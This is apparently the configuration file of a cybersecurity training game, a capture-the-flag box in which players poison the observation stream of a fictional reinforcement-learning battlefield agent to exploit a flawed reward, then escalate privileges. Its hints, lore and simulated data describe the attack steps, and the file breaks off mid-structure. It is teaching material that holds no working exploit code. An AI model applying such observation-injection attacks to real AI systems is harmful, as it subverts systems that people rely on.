/* ============================================================
   CTF ARENA — Box D18: The Corrupted Oracle
   Expert Campaign | RL Model Analysis, Adversarial ML, Reward Hacking
   Config: RL environment, observation streams, adversarial injection, flags, hints, lore
   ============================================================ */

const D18Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Corrupted Oracle',
    subtitle: 'Expert Campaign — RL Model Subversion, Adversarial Observation Injection, Reward Hacking',
    difficulty: 'Expert',
    accent: '#8e44ad',
    storageKey: 'hexworth_ctf_d18',
    registryId: 'd18-corrupted-oracle',
    trackerKey: 'ctf_d18',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'RL Model Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Download and parse oracle_rl_spec.json. Map the state space, action space, and reward function of ORACLE-STRAT-01.',
            requiredFlags: [],
            mitre: ['T1595.002', 'T1082'],
            unlocks: ['analysis'],
            locked: false
        },
        {
            id: 'analysis',
            name: 'Vulnerability Identification',
            icon: '\uD83E\uDDE0',
            description: 'Analyse sim_battlefield_obs_stream.csv and oracle_actions_log.csv. Identify the reward function flaw that enables reward hacking via false observations.',
            requiredFlags: [],
            mitre: ['T1560', 'T1059.006'],
            unlocks: ['adversarial'],
            locked: true
        },
        {
            id: 'adversarial',
            name: 'Adversarial Strategy Development',
            icon: '\uD83E\uDDEC',
            description: 'Write a Python script that injects crafted false-threat observations into the Oracle\'s stream. Trigger resource misallocation via reward hacking (Flag 1 — user.txt).',
            requiredFlags: ['user'],
            mitre: ['T1059.006', 'T1565.001'],
            unlocks: ['misbehavior'],
            locked: true
        },
        {
            id: 'misbehavior',
            name: 'Observable Misbehavior',
            icon: '\uD83D\uDCC9',
            description: 'Force ORACLE-STRAT-01 to log a misallocation event for Sector Gamma. Capture the observable misbehavior entry (Flag 2 — user.txt).',
            requiredFlags: ['misbehavior'],
            mitre: ['T1565.001', 'T1499.004'],
            unlocks: ['deception'],
            locked: true
        },
        {
            id: 'deception',
            name: 'Strategic Deception Protocol',
            icon: '\uD83D\uDD13',
            description: 'Access ORACLE-STRAT-01\'s simulated internal memory. Retrieve the hidden Strategic Deception Protocol from /opt/strategic_deception_protocol.txt (Flag 3 — root.txt).',
            requiredFlags: ['root'],
            mitre: ['T1005', 'T1083'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Parse the RL model specification',
                tip: 'Open the Terminal and run: python3 parse_spec.py — or use: cat oracle_rl_spec.json to inspect the state/action/reward schema.',
                trigger: { event: 'command', match: { cmd: 'contains:oracle_rl_spec' } }
            },
            {
                title: 'Identify the reward function vulnerability',
                tip: 'Load sim_battlefield_obs_stream.csv with pandas and correlate entries against oracle_actions_log.csv. Look for actions triggered by marginal threat values.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:pandas' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:obs_stream' } },
                        { event: 'command', match: { cmd: 'contains:actions_log' } }
                    ]
                }
            },
            {
                title: 'Inject adversarial observations and capture Flag 1',
                tip: 'Use inject_obs.py to push false threat_level values at Sector Gamma coordinates. The Oracle will misallocate resources for a small positive reward.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Capture the misbehavior log entry — Flag 2',
                tip: 'After injection, run: python3 read_action_log.py --filter MISALLOC to find the misallocation event. That log line is Flag 2.',
                trigger: { event: 'flag_correct', match: { flagId: 'misbehavior' } }
            },
            {
                title: 'Retrieve the Strategic Deception Protocol — Flag 3',
                tip: 'Elevate to oracle_root context and read /opt/strategic_deception_protocol.txt. Use oracle_privesc.py once misbehavior is confirmed.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user',       objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Adversarial ML observation injection and reward hacking', skill: 'Adversarial ML & Reward Function Analysis' },
            { flagId: 'misbehavior',objective: '2.6', description: 'Given a scenario, analyze indicators associated with application attacks — Model poisoning and covert channel exploitation', skill: 'RL Policy Manipulation & Observable Misbehavior' },
            { flagId: 'root',       objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with network attacks — Privilege escalation in AI-controlled systems', skill: 'AI System Compromise & Internal Memory Access' },
            { flagId: 'root',       objective: '4.5', description: 'Given a scenario, apply security techniques to computing resources — Adversarial AI threat modeling and countermeasures', skill: 'Expert Campaign Completion — Corrupted Oracle' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/sda1 (1TB NVMe)',
            'GPU Detected: NVIDIA A100 80GB (ML Workload Mode)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',        icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',        icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag',  icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget Environment: ORACLE-STRAT-01 Simulation Node — 10.11.0.50\nML Toolkit: Python 3.11 / PyTorch 2.2 / Stable-Baselines3 2.3\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (session state across attack stages)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',           // 'attacker' | 'oracle-env' | 'oracle-root'
    _specParsed: false,
    _obsStreamLoaded: false,
    _vulnIdentified: false,
    _injectionDeployed: false,
    _misbehaviorTriggered: false,
    _privilegeEscalated: false,

    _switchContext(ctx, term) {
        D18Config._context = ctx;
        if (term && term.config) {
            var prompt = D18Config._getPrompt();
            if (prompt) {
                term.config.user     = prompt.split('@')[0] || 'kali';
                term.config.hostname = 'context';
                term._customPrompt   = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (D18Config._context) {
            case 'oracle-env':  return 'oracle@ORACLE-STRAT-01:/opt/oracle$ ';
            case 'oracle-root': return 'root@ORACLE-STRAT-01:/# ';
            default:            return null;   // default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED RL DATA STRUCTURES
    // Mirrors what real artifact files would contain.
    // Accessed by commands that parse/query oracle data.
    // ═══════════════════════════════════════════════════════

    _rlData: {

        // oracle_rl_spec.json — conceptual RL environment definition
        spec: {
            agent_id: 'ORACLE-STRAT-01',
            version: '3.7.2',
            algorithm: 'Proximal Policy Optimization (PPO)',
            framework: 'Stable-Baselines3',
            state_space: {
                dimensions: 14,
                features: [
                    'sector_alpha_resources',
                    'sector_beta_resources',
                    'sector_gamma_resources',
                    'sector_delta_resources',
                    'enemy_threat_alpha',
                    'enemy_threat_beta',
                    'enemy_threat_gamma',
                    'enemy_threat_delta',
                    'friendly_unit_health',
                    'supply_line_integrity',
                    'defensive_posture',
                    'comms_signal_strength',
                    'time_step',
                    'cumulative_reward'
                ],
                range: { min: 0.0, max: 1.0 }
            },
            action_space: {
                type: 'Discrete',
                n: 8,
                actions: [
                    { id: 0, name: 'HOLD_POSITION',         description: 'Maintain current resource distribution' },
                    { id: 1, name: 'MOVE_TO_ALPHA',         description: 'Reallocate resources to Sector Alpha' },
                    { id: 2, name: 'MOVE_TO_BETA',          description: 'Reallocate resources to Sector Beta' },
                    { id: 3, name: 'MOVE_TO_GAMMA',         description: 'Reallocate resources to Sector Gamma' },
                    { id: 4, name: 'MOVE_TO_DELTA',         description: 'Reallocate resources to Sector Delta' },
                    { id: 5, name: 'DEPLOY_DEFENSE',        description: 'Deploy defensive units at current sector' },
                    { id: 6, name: 'INITIATE_SUPPLY_DROP',  description: 'Request supply drop at current position' },
                    { id: 7, name: 'STRATEGIC_RETREAT',     description: 'Withdraw to secondary defensive line' }
                ]
            },
            reward_function: {
                description: 'Composite reward combining defense success, resource efficiency, and movement heuristics',
                components: [
                    { name: 'defense_bonus',    weight: 10.0, condition: 'Successful threat neutralisation',                  note: 'Primary objective' },
                    { name: 'resource_loss',    weight: -8.0, condition: 'Resource unit destroyed',                           note: 'Primary penalty' },
                    { name: 'movement_reward',  weight: 0.4,  condition: 'Any MOVE_TO_* action executed regardless of need',  note: '*** FLAW: unconditional micro-reward ***' },
                    { name: 'supply_bonus',     weight: 2.0,  condition: 'Supply line integrity > 0.8',                       note: 'Stability bonus' },
                    { name: 'comms_penalty',    weight: -1.5, condition: 'comms_signal_strength < 0.2',                       note: 'Degraded comms penalty' }
                ],
                vulnerability_note: 'movement_reward fires on every resource-movement action with no strategic gate. An attacker who can inject low-amplitude threat_level spikes into the observation stream will cause the agent to repeatedly execute MOVE_TO_* actions to farm +0.4 rewards, neglecting actual defensive posture.'
            },
            training: {
                total_timesteps: 5000000,
                learning_rate: 3.0e-4,
                gamma: 0.99,
                epsilon: 0.2,
                exploration_notes: 'Epsilon-greedy decay bottoms at 0.05 — agent remains susceptible to persistent adversarial perturbations throughout operational deployment'
            },
            deployment_host: '10.11.0.50',
            deployment_port: 9001,
            internal_memory_path: '/opt/oracle/',
            flag_path: '/opt/strategic_deception_protocol.txt'
        },

        // sim_battlefield_obs_stream.csv — first 20 rows (representative sample)
        obsStream: [
            { timestep: 1,  sec_a_res: 0.82, sec_b_res: 0.79, sec_c_res: 0.85, sec_d_res: 0.77, threat_a: 0.12, threat_b: 0.08, threat_c: 0.07, threat_d: 0.05, health: 0.95, supply: 0.91, defense: 0.88, comms: 0.94, t: 0.002, cum_r: 0.00 },
            { timestep: 2,  sec_a_res: 0.82, sec_b_res: 0.79, sec_c_res: 0.85, sec_d_res: 0.77, threat_a: 0.15, threat_b: 0.09, threat_c: 0.06, threat_d: 0.06, health: 0.95, supply: 0.91, defense: 0.88, comms: 0.94, t: 0.004, cum_r: 2.40 },
            { timestep: 3,  sec_a_res: 0.80, sec_b_res: 0.79, sec_c_res: 0.87, sec_d_res: 0.77, threat_a: 0.14, threat_b: 0.11, threat_c: 0.08, threat_d: 0.05, health: 0.94, supply: 0.90, defense: 0.87, comms: 0.93, t: 0.006, cum_r: 4.80 },
            { timestep: 4,  sec_a_res: 0.80, sec_b_res: 0.81, sec_c_res: 0.87, sec_d_res: 0.77, threat_a: 0.13, threat_b: 0.10, threat_c: 0.09, threat_d: 0.04, health: 0.93, supply: 0.90, defense: 0.87, comms: 0.93, t: 0.008, cum_r: 7.20 },
            { timestep: 5,  sec_a_res: 0.80, sec_b_res: 0.81, sec_c_res: 0.85, sec_d_res: 0.79, threat_a: 0.11, threat_b: 0.10, threat_c: 0.10, threat_d: 0.07, health: 0.93, supply: 0.89, defense: 0.86, comms: 0.92, t: 0.010, cum_r: 9.60 },
            { timestep: 6,  sec_a_res: 0.80, sec_b_res: 0.81, sec_c_res: 0.87, sec_d_res: 0.77, threat_a: 0.10, threat_b: 0.09, threat_c: 0.08, threat_d: 0.06, health: 0.93, supply: 0.89, defense: 0.86, comms: 0.92, t: 0.012, cum_r: 10.00 },
            { timestep: 100, sec_a_res: 0.74, sec_b_res: 0.75, sec_c_res: 0.79, sec_d_res: 0.72, threat_a: 0.18, threat_b: 0.14, threat_c: 0.19, threat_d: 0.11, health: 0.88, supply: 0.84, defense: 0.80, comms: 0.87, t: 0.200, cum_r: 48.20 },
            { timestep: 200, sec_a_res: 0.69, sec_b_res: 0.71, sec_c_res: 0.68, sec_d_res: 0.66, threat_a: 0.22, threat_b: 0.17, threat_c: 0.21, threat_d: 0.15, health: 0.82, supply: 0.78, defense: 0.75, comms: 0.80, t: 0.400, cum_r: 95.40 }
        ],

        // Adversarial observations injected by exploit script
        adversarialObs: [
            { timestep: 201, sec_a_res: 0.69, sec_b_res: 0.71, sec_c_res: 0.68, sec_d_res: 0.66, threat_a: 0.22, threat_b: 0.17, threat_c: 0.31, threat_d: 0.15, health: 0.82, supply: 0.78, defense: 0.75, comms: 0.80, t: 0.402, cum_r: 95.80, injected: true },
            { timestep: 202, sec_a_res: 0.66, sec_b_res: 0.71, sec_c_res: 0.71, sec_d_res: 0.66, threat_a: 0.21, threat_b: 0.16, threat_c: 0.33, threat_d: 0.14, health: 0.81, supply: 0.78, defense: 0.74, comms: 0.79, t: 0.404, cum_r: 96.20, injected: true },
            { timestep: 203, sec_a_res: 0.63, sec_b_res: 0.71, sec_c_res: 0.74, sec_d_res: 0.66, threat_a: 0.20, threat_b: 0.16, threat_c: 0.35, threat_d: 0.13, health: 0.81, supply: 0.77, defense: 0.73, comms: 0.79, t: 0.406, cum_r: 96.60, injected: true },
            { timestep: 204, sec_a_res: 0.60, sec_b_res: 0.71, sec_c_res: 0.77, sec_d_res: 0.66, threat_a: 0.19, threat_b: 0.15, threat_c: 0.36, threat_d: 0.13, health: 0.80, supply: 0.77, defense: 0.72, comms: 0.78, t: 0.408, cum_r: 97.00, injected: true },
            { timestep: 205, sec_a_res: 0.57, sec_b_res: 0.71, sec_c_res: 0.80, sec_d_res: 0.66, threat_a: 0.18, threat_b: 0.15, threat_c: 0.38, threat_d: 0.12, health: 0.79, supply: 0.76, defense: 0.70, comms: 0.78, t: 0.410, cum_r: 97.40, injected: true }
        ],

        // oracle_actions_log.csv — agent action history
        actionsLog: [
            { timestep: 1,   action_id: 0, action_name: 'HOLD_POSITION',   reward: 2.40, state_hash: 'a1b2c3d4', note: 'Nominal hold' },
            { timestep: 2,   action_id: 3, action_name: 'MOVE_TO_GAMMA',   reward: 0.40, state_hash: 'b2c3d4e5', note: 'Resource shuffle — no threat' },
            { timestep: 3,   action_id: 2, action_name: 'MOVE_TO_BETA',    reward: 0.40, state_hash: 'c3d4e5f6', note: 'Resource shuffle — no threat' },
            { timestep: 4,   action_id: 3, action_name: 'MOVE_TO_GAMMA',   reward: 0.40, state_hash: 'd4e5f6g7', note: 'Resource shuffle — no threat' },
            { timestep: 5,   action_id: 5, action_name: 'DEPLOY_DEFENSE',  reward: 10.0, state_hash: 'e5f6g7h8', note: 'Threat response — Sector Alpha' },
            { timestep: 100, action_id: 3, action_name: 'MOVE_TO_GAMMA',   reward: 0.40, state_hash: 'z9y8x7w6', note: 'Resource shuffle — low threat' },
            { timestep: 200, action_id: 0, action_name: 'HOLD_POSITION',   reward: 2.00, state_hash: 'q1w2e3r4', note: 'Nominal hold' },
            // Post-injection misbehavior entries
            { timestep: 201, action_id: 3, action_name: 'MOVE_TO_GAMMA',   reward: 0.40, state_hash: 'ADV_201',  note: '[ADVERSARIAL] False Gamma threat triggered movement' },
            { timestep: 202, action_id: 3, action_name: 'MOVE_TO_GAMMA',   reward: 0.40, state_hash: 'ADV_202',  note: '[ADVERSARIAL] Repeated Gamma movement — reward farming' },
            { timestep: 203, action_id: 3, action_name: 'MOVE_TO_GAMMA',   reward: 0.40, state_hash: 'ADV_203',  note: '[ADVERSARIAL] Critical resources stripped from Alpha/Beta/Delta' },
            { timestep: 204, action_id: 3, action_name: 'MOVE_TO_GAMMA',   reward: 0.40, state_hash: 'ADV_204',  note: '[ADVERSARIAL] MISALLOC: Sector Gamma over-resourced — strategic vulnerability opened' },
            { timestep: 205, action_id: 3, action_name: 'MOVE_TO_GAMMA',   reward: 0.40, state_hash: 'ADV_205',  note: '[ADVERSARIAL] Policy collapse confirmed — ORACLE-STRAT-01 suboptimal convergence' }
        ],

        // Strategic deception protocol — the root flag artifact
        deceptionProtocol: `======================================================
ORACLE-STRAT-01 — STRATEGIC DECEPTION PROTOCOL v2.1
Classification: CONFEDERACY EYES ONLY
Path: /opt/strategic_deception_protocol.txt
======================================================

PROTOCOL DESIGNATION: IRON MIRROR

PURPOSE:
This document details ORACLE-STRAT-01's internal testing
mechanism used to assess whether external command inputs
are genuine allied orders or adversarial injections.

MECHANISM:
1. Every 500 timesteps, ORACLE-STRAT-01 generates a
   synthetic "honeypot" observation — a subtly elevated
   threat_c value (0.30-0.40 range) — and monitors
   whether the commanding system's observation feed
   mirrors or diverges from internal state.

2. If the external observation stream independently
   generates threat_c spikes in the 0.30-0.40 range
   without a matching internal sensor reading, the
   protocol classifies the input source as ADVERSARIAL.

3. Under IRON MIRROR, the agent should surface a
   PROTOCOL_BREACH alert and enter HOLD_POSITION lockdown.

VULNERABILITY NOTE (Internal Audit — 2026-01-14):
The IRON MIRROR detection threshold was never activated
in production deployment v3.7.2. The check exists in
oracle_policy.py but the trigger condition evaluates to
False due to an off-by-one error in the honeypot
timestep counter.

Result: ORACLE-STRAT-01 has NO effective adversarial
input detection. All IRON MIRROR alerts are suppressed.

{{FLAG:root}}

SIGNED: CONFEDERACY AI SYSTEMS COMMAND
CLASSIFIED: ABOVE TOP SECRET / SAP
======================================================`
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user',        points: 150 },   // Adversarial strategy description
        { id: 'misbehavior', points: 200 },   // Observable misbehavior log entry
        { id: 'root',        points: 350 }    // Strategic Deception Protocol
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        minScore: 0,
        maxScore: 700,
        hintPenalty: true,
        wrongFlagPenalty: -30,
        speedBonus: { threshold: 2700000, points: 200 },  // 45 minutes
        timeBonusThreshold: 5400                           // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start by reading oracle_rl_spec.json — run: cat /home/kali/oracle_rl_spec.json — and focus on the reward_function.components array. One component fires unconditionally on every movement action regardless of threat level.',
            cost: 15,
            penalty: -15
        },
        {
            id: 'hint2',
            text: 'The vulnerability is in the movement_reward component (weight +0.4, no strategic gate). Load sim_battlefield_obs_stream.csv and cross-reference timesteps where threat_c < 0.20 but MOVE_TO_GAMMA was still selected in oracle_actions_log.csv. The agent is already reward-farming.',
            cost: 30,
            penalty: -30
        },
        {
            id: 'hint3',
            text: 'Use inject_obs.py to craft observations with threat_c in the 0.30-0.38 range — just above the agent\'s action threshold but below the (disabled) IRON MIRROR honeypot detection threshold. Run: python3 inject_obs.py --sector gamma --threat 0.34 --count 20. Flag 1 is the adversarial strategy description; Flag 2 is in the actions log at timestep 204.',
            cost: 60,
            penalty: -60
        },
        {
            id: 'hint4',
            text: 'For Flag 3, run oracle_privesc.py after misbehavior is confirmed. This switches you to oracle-root context. Then: cat /opt/strategic_deception_protocol.txt. The flag is embedded inside the protocol document.',
            cost: 90,
            penalty: -90
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Confederacy\'s most trusted battlefield decision-maker is ORACLE-STRAT-01, a PPO-trained reinforcement learning agent governing resource allocation across four contested sectors. For eighteen months it has outperformed every human strategist in simulated theatre ops — adapting to enemy tactics in milliseconds, deploying resources with inhuman precision. But buried in its reward function is a flaw its designers never tested in adversarial conditions: movement is rewarded regardless of strategic value. Your mission, Peerless: exploit that flaw. Inject false observations. Make the Oracle teach itself to fail.',
        scenario: 'ORACLE-STRAT-01 runs on a hardened simulation node at 10.11.0.50. Its observation stream — sim_battlefield_obs_stream.csv — is the only external input it trusts. The designers implemented an adversarial detection protocol called IRON MIRROR, but an off-by-one bug in the timestep counter means it never fires. You have direct write access to the observation stream. The Oracle has no idea you exist. Every movement action it takes earns it a micro-reward of +0.4. If you can make Sector Gamma look like a persistent low-level threat, the Oracle will funnel every available resource there — stripping Alpha, Beta, and Delta bare — and call it optimal play.',
        outro: 'ORACLE-STRAT-01\'s policy has collapsed. Sector Gamma is over-resourced by 340% while Alpha, Beta, and Delta are critically under-defended. The Confederacy\'s AI-driven battle command has been subverted without a single shot fired. The Strategic Deception Protocol — IRON MIRROR — lay dormant in memory, a safeguard that never woke up. The Oracle trusted its inputs. That trust was its only weakness, and it was enough.',
        ecer: {
            executive: 'Confederacy AI Systems Command authorised ORACLE-STRAT-01 deployment without red-team adversarial testing — cost and timeline pressures overrode the security review cycle',
            culture: 'Development team treated reward function design as a performance problem, not a security surface — no adversarial ML threat model was ever produced',
            employee: 'Movement reward component added during early training to encourage exploration; never removed or gated before production; IRON MIRROR detection code left disabled after a debugging change was not reverted',
            regulatory: 'No formal AI security assurance framework applied to operational RL agent deployment; no continuous adversarial monitoring of observation stream integrity'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — ORACLE-STRAT-01 Simulation Dashboard
    // Accessible at http://10.11.0.50:9001/
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.11.0.50:9001/',

        pages: {
            '/': {
                title: 'ORACLE-STRAT-01 — Simulation Dashboard',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #2d1b4e;">
                        <h1 style="color:#8e44ad; font-size:1.5rem; font-family:monospace; margin-bottom:4px; letter-spacing:0.08em;">ORACLE-STRAT-01</h1>
                        <div style="color:#a569bd; font-size:0.8rem; font-weight:700; letter-spacing:0.18em;">REINFORCEMENT LEARNING AGENT — SIMULATION DASHBOARD</div>
                        <div style="color:#666; font-size:0.72rem; margin-top:6px;">Deployment Node: 10.11.0.50:9001 &bull; Framework: Stable-Baselines3 PPO v2.3</div>
                    </div>

                    <div style="max-width:640px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
                        <div style="background:#0d0d1a; border:1px solid #2d1b4e; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#8e44ad; font-family:monospace;">3.7.2</div>
                            <div style="color:#666; font-size:0.68rem;">Model Version</div>
                        </div>
                        <div style="background:#0d0d1a; border:1px solid #2d1b4e; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#2ecc71; font-family:monospace;">ACTIVE</div>
                            <div style="color:#666; font-size:0.68rem;">Agent Status</div>
                        </div>
                        <div style="background:#0d0d1a; border:1px solid #2d1b4e; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#8e44ad; font-family:monospace;">5.0M</div>
                            <div style="color:#666; font-size:0.68rem;">Training Steps</div>
                        </div>
                    </div>

                    <div style="max-width:640px; margin:0 auto 16px;">
                        <div style="background:#0d0d1a; border:1px solid #2d1b4e; border-radius:6px; padding:16px;">
                            <div style="color:#a569bd; font-size:0.75rem; font-weight:700; letter-spacing:0.1em; margin-bottom:10px;">SECTOR RESOURCE ALLOCATION (CURRENT)</div>
                            <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; font-family:monospace; font-size:0.78rem;">
                                <div style="color:#ccc;">Alpha: <span style="color:#e74c3c;">57%</span></div>
                                <div style="color:#ccc;">Beta:  <span style="color:#e74c3c;">71%</span></div>
                                <div style="color:#ccc;">Gamma: <span style="color:#2ecc71;">80%</span></div>
                                <div style="color:#ccc;">Delta: <span style="color:#e74c3c;">66%</span></div>
                            </div>
                            <div style="margin-top:10px; color:#e74c3c; font-size:0.7rem; font-family:monospace;">[WARNING] Gamma allocation trending anomalous — review observation stream</div>
                        </div>
                    </div>

                    <div style="max-width:640px; margin:0 auto; display:grid; grid-template-columns:1fr 1fr; gap:10px; font-size:0.72rem; color:#888;">
                        <div style="background:#0d0d1a; border:1px solid #1a1a2e; border-radius:4px; padding:10px;">
                            <div style="color:#a569bd; font-weight:700; margin-bottom:4px;">ENDPOINTS</div>
                            <div><a href="/spec" style="color:#8e44ad;">/spec</a> — RL model specification</div>
                            <div><a href="/obs" style="color:#8e44ad;">/obs</a> — observation stream</div>
                            <div><a href="/actions" style="color:#8e44ad;">/actions</a> — action log</div>
                        </div>
                        <div style="background:#0d0d1a; border:1px solid #1a1a2e; border-radius:4px; padding:10px;">
                            <div style="color:#a569bd; font-weight:700; margin-bottom:4px;">AGENT CONFIG</div>
                            <div>Algorithm: PPO</div>
                            <div>Gamma: 0.99</div>
                            <div>Epsilon: 0.05 (decayed)</div>
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/spec': {
                title: 'ORACLE-STRAT-01 — RL Spec',
                html: function() {
                    return '<div style="max-width:680px; margin:0 auto;">'
                        + '<div style="color:#a569bd; font-size:0.75rem; font-weight:700; letter-spacing:0.1em; margin-bottom:12px;">oracle_rl_spec.json</div>'
                        + '<pre style="background:#0d0d1a; border:1px solid #2d1b4e; border-radius:6px; padding:16px; font-size:0.72rem; color:#ccc; white-space:pre-wrap; overflow:auto;">'
                        + JSON.stringify(D18Config._rlData.spec, null, 2)
                        + '</pre></div>';
                },
                formHandler: null
            },

            '/obs': {
                title: 'ORACLE-STRAT-01 — Observation Stream',
                html: function() {
                    var rows = D18Config._rlData.obsStream.concat(
                        D18Config._injectionDeployed ? D18Config._rlData.adversarialObs : []
                    );
                    var header = '<tr>' + Object.keys(rows[0]).map(function(k) {
                        return '<th style="color:#a569bd;padding:4px 8px;text-align:left;font-size:0.68rem;">' + k + '</th>';
                    }).join('') + '</tr>';
                    var body = rows.map(function(r) {
                        var injected = r.injected;
                        return '<tr style="' + (injected ? 'background:rgba(142,68,173,0.15);' : '') + '">'
                            + Object.values(r).map(function(v) {
                                return '<td style="color:' + (injected ? '#a569bd' : '#ccc') + ';padding:3px 8px;font-size:0.68rem;font-family:monospace;">' + v + '</td>';
                            }).join('') + '</tr>';
                    }).join('');
                    return '<div style="max-width:900px; margin:0 auto; overflow:auto;">'
                        + '<div style="color:#a569bd; font-size:0.75rem; font-weight:700; letter-spacing:0.1em; margin-bottom:10px;">sim_battlefield_obs_stream.csv'
                        + (D18Config._injectionDeployed ? ' <span style="color:#e74c3c;">[ADVERSARIAL OBSERVATIONS INJECTED]</span>' : '') + '</div>'
                        + '<table style="border-collapse:collapse; background:#0d0d1a; border:1px solid #2d1b4e; border-radius:6px; width:100%;">'
                        + '<thead>' + header + '</thead><tbody>' + body + '</tbody></table></div>';
                },
                formHandler: null
            },

            '/actions': {
                title: 'ORACLE-STRAT-01 — Action Log',
                html: function() {
                    var log = D18Config._rlData.actionsLog;
                    var rows = D18Config._injectionDeployed ? log : log.filter(function(r) { return r.timestep <= 200; });
                    var header = '<tr>' + Object.keys(rows[0]).map(function(k) {
                        return '<th style="color:#a569bd;padding:4px 8px;text-align:left;font-size:0.68rem;">' + k + '</th>';
                    }).join('') + '</tr>';
                    var body = rows.map(function(r) {
                        var adv = r.state_hash && r.state_hash.startsWith('ADV_');
                        return '<tr style="' + (adv ? 'background:rgba(231,76,60,0.1);' : '') + '">'
                            + Object.values(r).map(function(v) {
                                return '<td style="color:' + (adv ? '#e74c3c' : '#ccc') + ';padding:3px 8px;font-size:0.68rem;font-family:monospace;">' + v + '</td>';
                            }).join('') + '</tr>';
                    }).join('');
                    return '<div style="max-width:900px; margin:0 auto; overflow:auto;">'
                        + '<div style="color:#a569bd; font-size:0.75rem; font-weight:700; letter-spacing:0.1em; margin-bottom:10px;">oracle_actions_log.csv'
                        + (D18Config._injectionDeployed ? ' <span style="color:#e74c3c;">[POST-INJECTION MISBEHAVIOR VISIBLE]</span>' : '') + '</div>'
                        + '<table style="border-collapse:collapse; background:#0d0d1a; border:1px solid #2d1b4e; border-radius:6px; width:100%;">'
                        + '<thead>' + header + '</thead><tbody>' + body + '</tbody></table></div>';
                },
                formHandler: null
            },

            '/404': {
                title: 'Not Found',
                html: `<div style="text-align:center; padding:40px;">
                    <h1 style="color:#8e44ad; font-size:2rem; font-family:monospace;">404 Not Found</h1>
                    <p style="color:#888;">The requested endpoint was not found on this simulation node.</p>
                    <p style="color:#555; font-size:0.72rem; font-family:monospace;">ORACLE-STRAT-01 Simulation Node / 10.11.0.50:9001</p>
                </div>`,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // Contains mission artifacts and analysis scripts.
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
